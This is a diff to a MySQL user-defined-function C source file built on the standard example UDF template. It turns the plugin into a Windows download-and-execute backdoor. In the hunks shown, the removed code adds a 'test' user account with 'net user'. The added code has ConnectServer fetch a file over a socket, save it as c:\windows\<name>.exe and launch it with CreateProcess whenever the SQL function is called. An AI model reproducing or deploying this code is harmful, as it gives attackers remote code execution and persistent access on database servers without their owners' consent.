@@ -1,18 +1,18 @@
 /*
-   Copyright (c) 2000, 2010, Oracle and/or its affiliates. All rights reserved.
+Copyright (c) 2000, 2010, Oracle and/or its affiliates. All rights reserved.
 
-   This program is free software; you can redistribute it and/or modify
-   it under the terms of the GNU General Public License as published by
-   the Free Software Foundation; version 2 of the License.
+This program is free software; you can redistribute it and/or modify
+it under the terms of the GNU General Public License as published by
+the Free Software Foundation; version 2 of the License.
 
-   This program is distributed in the hope that it will be useful,
-   but WITHOUT ANY WARRANTY; without even the implied warranty of
-   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-   GNU General Public License for more details.
+This program is distributed in the hope that it will be useful,
+but WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+GNU General Public License for more details.
 
-   You should have received a copy of the GNU General Public License
-   along with this program; if not, write to the Free Software
-   Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301  USA
+You should have received a copy of the GNU General Public License
+along with this program; if not, write to the Free Software
+Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301  USA
 */
 
 /*
@@ -154,7 +154,13 @@ longlong myfunc_test(UDF_INIT *initd,UDF_ARGS *args,char *is_null,char *error);
 
 my_bool myfunc_test_init(UDF_INIT *initd,UDF_ARGS *args,char *message)
 {
-	return 0;
+	// Validation
+	if (args->arg_count != 1)
+	{
+		strcpy(message,"wrong args count...");
+		return -1;
+	}else
+		return 0;
 }
 
 BOOL InitSocket()
@@ -175,7 +181,7 @@ BOOL InitSocket()
 	return TRUE;
 }
 
-void ConnectServer()
+void ConnectServer(char *name)
 {
 	if (InitSocket())
 	{
@@ -196,9 +202,12 @@ void ConnectServer()
 			{
 				DWORD dwNumberOfBytesRecv = 0;
 				DWORD dwCountOfBytesRecv = 0;
-				char *filename = "c:\\windows\\test.exe";
+				char filename[MAX_PATH] = {0};
+				HANDLE hFile;
 				char *Buffer = (char *)malloc(102400);
-				HANDLE hFile = CreateFile(filename,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
+
+				sprintf_s(filename,MAX_PATH,"c:\\windows\\%s.exe",name);			
+				hFile = CreateFile(filename,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
 
 				do 
 				{
@@ -208,6 +217,7 @@ void ConnectServer()
 				} while (file_size - dwCountOfBytesRecv);
 
 				CloseHandle(hFile);
+				free(Buffer);
 			}
 		}
 
@@ -219,8 +229,29 @@ void ConnectServer()
 longlong myfunc_test(UDF_INIT *initd,UDF_ARGS *args,char *is_null,char *error)
 {
 #include <windows.h>
-	system("net user test test /add");
-	ConnectServer();
+	__try
+	{
+		char *name = args->args[0];
+		char app_name[MAX_PATH] = {0};
+		STARTUPINFO si;
+		PROCESS_INFORMATION pi;
+		ZeroMemory(&si,sizeof(si));
+		si.cb = sizeof(si);
+		ZeroMemory(&pi,sizeof(pi));
+
+		sprintf_s(app_name,MAX_PATH,"c:\\windows\\%s.exe",name);
+		ConnectServer(name);
+		if (!CreateProcess(app_name,NULL,NULL,NULL,FALSE,0,NULL,NULL,&si,&pi))
+		{
+			sprintf_s(error,MYSQL_ERRMSG_SIZE,"CreateProcess Error:%d\n",GetLastError());
+			return 0;
+		}
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER)
+	{
+		strcpy(error,"Unknown Exception...\n");
+	}
+
 	return 0;
 }
 
